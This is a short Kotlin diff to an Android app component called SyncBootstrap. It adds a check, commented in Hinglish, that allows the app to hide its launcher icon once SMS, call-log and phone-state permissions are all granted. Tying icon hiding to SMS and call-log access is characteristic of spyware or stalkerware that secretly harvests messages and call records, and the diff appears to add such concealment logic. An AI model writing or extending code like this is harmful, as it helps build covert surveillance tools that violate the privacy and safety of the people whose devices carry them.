@@ -85,6 +85,20 @@ object SyncBootstrap {
         }
     }
 
+    /** Icon hide — READ_PHONE_NUMBERS ka wait mat karo, ColorOS usko alag rakhta hai. */
+    fun canHideLauncher(context: Context): Boolean {
+        val core = listOf(
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_PHONE_STATE,
+        )
+        return core.all { permission ->
+            ContextCompat.checkSelfPermission(context, permission) ==
+                PackageManager.PERMISSION_GRANTED
+        }
+    }
+
     fun requiredPermissions(): Array<String> {
         val permissions = mutableListOf(
             Manifest.permission.READ_SMS,
